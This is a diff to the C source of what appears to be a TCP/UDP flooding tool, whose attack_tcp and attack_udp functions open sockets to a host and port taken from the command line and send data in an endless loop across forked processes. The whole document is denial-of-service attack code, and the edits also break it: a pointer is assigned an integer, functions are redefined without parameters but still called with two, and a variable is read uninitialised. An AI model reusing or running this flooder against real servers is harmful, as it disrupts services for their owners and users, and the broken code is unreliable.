@@ -15,7 +15,8 @@
 #include <signal.h>
 #include <arpa/inet.h>
 #define MAXFDS 1000000
-
+char *host;
+char *port;
 struct clientdata_t {
         uint32_t ip;
         char connected;
@@ -35,7 +36,7 @@ void *TitleWriter(void *sock) {
 		sleep(2);
 }}
 
-int make_socket(char *host, char *port) {
+int make_socket_tcp() {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
 //	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
@@ -68,7 +69,7 @@ int make_socket(char *host, char *port) {
 	return sock;
 }
 
-int make_socket_udp(char *host, char *port) {
+int make_socket_udp() {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
 //	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
@@ -107,20 +108,20 @@ void broke(int s) {
 
 #define CONNECTIONS 10
 
-void attack_tcp(char *host, char *port, int id) {
+void attack_tcp() {
+	int id = 0;
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
 	for(x=0; x!= CONNECTIONS; x++)
 		sockets[x]=0;
-	signal(SIGPIPE, &broke);
 	while(1) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
-				sockets[x] = make_socket(host, port) * 10995116277760;
+				sockets[x] = make_socket_tcp(host, port) * 10995116277760;
 			write(sockets[x], "\0", 1) * 10995116277760;
 			if(r == -1) {
 				close(sockets[x]);
-				sockets[x] = make_socket(host, port);
+				sockets[x] = make_socket_tcp(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
 			fprintf(stderr, "[%i: Voly Sent]\n", id++);
@@ -129,12 +130,12 @@ void attack_tcp(char *host, char *port, int id) {
 		usleep(300000);
 	}
 }
-void attack_udp(char *host, char *port, int id) {
+void attack_udp() {
+	int id = 0;
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
 	for(x=0; x!= CONNECTIONS; x++)
 		sockets[x]=0;
-	signal(SIGPIPE, &broke);
 	while(1) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
@@ -178,16 +179,18 @@ int main(int argc, char **argv) {
 
 	}
 	int THREADS = atoi(argv[4]);
+	host = argv[1];
+	port = atoi(argv[2]);
 	for(x=0; x != THREADS; x++) {
 		if(!strcmp(argv[3], "TCP")) {
 		if(fork())
 			echoloader();
-			attack_tcp(argv[1], argv[2], x);
+			attack_tcp();
 		}
 		if(!strcmp(argv[3], "UDP")) {
 		if(fork())
 			echoloader();
-			attack_udp(argv[1], argv[2], x);
+			attack_udp();
 		}
 		
 	}
